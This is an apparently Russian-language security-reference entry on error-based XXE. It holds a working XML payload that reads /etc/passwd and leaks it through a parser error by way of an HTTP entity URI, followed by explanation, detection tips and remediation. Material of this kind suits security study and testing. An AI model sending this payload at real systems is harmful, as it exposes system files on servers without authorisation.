---
id: xxe-error-based-entity
title: "Error-based XXE: вывод данных через сообщение об ошибке"
type: xxe
target: xml
category: web
difficulty: advanced
bypass: filter
tags: [xxe, error-based]
tested_on: ["Java Xerces", "PHP libxml"]
success_rate: 0.5
risk: high
cwe: "CWE-611"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
graph:
  - target: "xxe"
    type: instance_of
  - target: "info-disclosure"
    type: leads_to
---

# Error-based XXE: вывод данных через сообщение об ошибке

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % x SYSTEM "file:///etc/passwd"><!ENTITY % e "<!ENTITY &#x25; f SYSTEM 'http://x/?%x;'>"> %e; %f;]>
<root>1</root>
```

## Explanation

Некоторые парсеры выводят текст ошибки, включающий неразрешённую сущность или
некорректный URI — вместе с содержимым файла. Классический приём: объявить сущность,
ссылающуюся на URI с недопустимыми символами, и получить `URI malformed: root:x:0:0...`
в ответе. Вариант для Java — `jar://`/`netdoc://` и исключение `FileNotFoundException`
с раскрытым содержимым.

## Detection

Следите за текстом ошибок парсера в ответе. Наличие `<!DOCTYPE` в ошибке —
признак, что DTD обрабатывается. Также работает техника с недопустимым URL
(пробел/двоеточие в пути), чтобы спровоцировать ошибку с данными.

## Remediation

- Отключить DTD и внешние сущности.
- Не возвращать клиенту текст ошибок XML-парсера (общая страница + лог).
- `defusedxml`, безопасные настройки по умолчанию в фреймворке.
